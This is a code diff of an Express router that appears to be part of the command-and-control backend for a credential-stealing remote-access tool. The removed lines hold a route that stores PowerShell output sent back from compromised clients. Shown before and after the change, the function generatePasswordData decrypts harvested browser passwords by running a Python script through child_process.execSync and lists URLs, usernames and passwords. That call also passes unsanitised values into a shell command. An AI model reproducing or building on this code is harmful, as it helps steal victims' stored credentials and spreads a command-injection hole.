@@ -1,33 +1,13 @@
 const router = require('express').Router();
 const Response = require('../responses.model');
 const psResponse = require('../psResponse.model');
-const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
-const {GenerateRandomId} = require("../../Utils/utilFunctions");
-const Utils = require("../../Utils/utilFunctions");
-const Client = require('../../Clients/client.model');
+const {GenerateRandomId} = require("../../../Utils/UtilFunctions/utilFunctions");
+const Utils = require("../../../Utils/UtilFunctions/utilFunctions");
+const Client = require('../../tool.model');
 const Command = require("../../Commands/commands.model");
 const path = require("path");
 const child_process = require("child_process");
 const appDir = path.dirname(require.main.filename);
-const base64Decode = require('../../Utils/MiddleWears/base64')
-const express = require("express");
-
-
-//Validate cookie for incoming requests
-router.use(toolCookieValidator);
-router.use(base64Decode);
-router.use(express.json());
-
-//Powershell response
-router.route('/ps').post((req, res) => {
-    const response_id = GenerateRandomId(6);
-    const clientId = req.headers['clientid'];
-    const response = req.body.response;
-    const newPsResponse = new psResponse({response_id: response_id, client_id: clientId, response: response});
-    newPsResponse.save()
-        .then(() => res.send())
-        .catch(err => res.status(401).send());
-});
 
 
 //Regular command response
@@ -88,15 +68,19 @@ function generatePasswordData(data, masterKey) {
     let buffer = ""
     let decryptedPass = ""
     for (let object in data) {
-        let url = data[object][0]['url']
-        let username = data[object][1]['username']
-        let password = data[object][2]['password']
-        if (url && username && password) {
-            buffer += `[+] Url: ${url}\n`
-            buffer += `[+] Username: ${username}\n`
-            decryptedPass = child_process.execSync(`python3 `+path.resolve(appDir,'scripts','decrypt.py')+` ${password} ${masterKey}`)
-            buffer += `[+] Password: ${decryptedPass}\n`
+        if(data.hasOwnProperty(object)){
+            let url = data[object][0]['url']
+            let username = data[object][1]['username']
+            let password = data[object][2]['password']
+            if (url && username && password) {
+                buffer += `[+] Url: ${url}\n`
+                buffer += `[+] Username: ${username}\n`
+                decryptedPass = child_process.execSync(`python3 `+path.resolve(appDir,'scripts','decrypt.py')+` ${password} ${masterKey}`)
+                buffer += `[+] Password: ${decryptedPass}\n`
+            }
         }
+        else
+            buffer = "No passwords have been found"
     }
     return buffer
 }
